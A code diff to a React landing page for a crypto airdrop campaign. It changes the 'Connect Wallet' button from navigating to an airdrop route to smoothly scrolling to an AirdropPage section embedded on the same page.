@@ -1,9 +1,21 @@
-import { useNavigate } from 'react-router-dom'
+import { useEffect } from 'react'
+import { useLocation } from 'react-router-dom'
 import { IoArrowDown } from 'react-icons/io5'
+import AirdropPage from '../AirdropPage/AirdropPage'
 import trustShield from '../../assets/trust-shield.png'
 
 function LandingPage() {
-  const navigate = useNavigate()
+  const location = useLocation()
+
+  const scrollToAirdrop = () => {
+    document.getElementById('airdrop')?.scrollIntoView({ behavior: 'smooth' })
+  }
+
+  useEffect(() => {
+    if (location.pathname === '/airdrop') {
+      window.requestAnimationFrame(scrollToAirdrop)
+    }
+  }, [location.pathname])
 
   return (
     <main className="landing-page">
@@ -26,7 +38,7 @@ function LandingPage() {
             Our airdrop campaign is now live! Connect your wallet below to check
             your eligibility.
           </span>
-          <button type="button" onClick={() => navigate('/airdrop')}>
+          <button type="button" onClick={scrollToAirdrop}>
             Connect Wallet
           </button>
         </section>
@@ -35,6 +47,8 @@ function LandingPage() {
           <IoArrowDown />
         </div>
       </div>
+
+      <AirdropPage asSection id="airdrop" />
     </main>
   )
 }
